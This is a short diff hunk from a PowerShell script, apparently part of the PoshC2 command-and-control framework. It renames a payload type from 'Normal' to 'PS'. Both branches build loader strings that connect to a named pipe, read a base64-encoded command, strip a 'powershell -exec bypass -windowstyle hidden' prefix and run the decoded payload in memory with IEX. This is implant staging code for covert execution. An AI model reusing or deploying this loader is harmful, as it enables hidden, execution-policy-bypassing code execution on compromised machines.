@@ -71,7 +71,7 @@ Param(
         if ($PayloadType -eq "Proxy") {
             $PoshCode = "add-Type -assembly `"System.Core`"; `$pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSProxy'); `$pi.Connect(); `$pr = new-object System.IO.StreamReader(`$pi); IEX ([System.Text.Encoding]::UNICODE.GetString([System.Convert]::FromBase64String((`$pr.ReadLine() -replace `"powershell -exec bypass -Noninteractive -windowstyle hidden -e `",`"`"))))"
         }
-        if ($PayloadType -eq "Normal") {
+        if ($PayloadType -eq "PS") {
             $PoshCode = "add-Type -assembly `"System.Core`"; `$pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMS'); `$pi.Connect(); `$pr = new-object System.IO.StreamReader(`$pi); IEX ([System.Text.Encoding]::UNICODE.GetString([System.Convert]::FromBase64String((`$pr.ReadLine() -replace `"powershell -exec bypass -Noninteractive -windowstyle hidden -e `",`"`"))))"
         }
     }
